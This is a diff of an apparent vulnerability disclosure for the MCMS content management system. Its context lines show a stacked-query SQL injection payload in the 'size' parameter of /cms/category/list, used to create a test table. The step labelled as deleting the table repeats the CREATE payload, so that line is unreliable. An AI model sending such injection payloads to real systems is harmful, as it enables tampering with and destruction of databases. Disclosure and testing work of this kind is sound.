@@ -22,15 +22,14 @@ Front-end accepts parameter points:
 
 ![image-20260724111952531](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片1.2rvu819ojh.webp)
 
-![image-20260724114530639](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片2.83aqsqwngs.webp)
 
 Before executing the SQL injection payload:
 
-![image-20260724112230187](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片3.3nsbnhkfow.webp)
+![image-20260724112230187](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片2.83aqsqwngs.webp)
 
 Executing the database creation statement, test724 is successfully created: /cms/category/list?type=top&size=1; CREATE %20TABLE %20test724(id %20INT); --     
 
-![image-20260724112245040](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片4.26m6lqgevp.webp)
+![image-20260724112245040](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片3.3nsbnhkfow.webp)
 
 Executing the delete database statement, test724 was successfully deleted: /cms/category/list?type=top&size=1; CREATE%20TABLE%20test724(id%20INT); --      
 
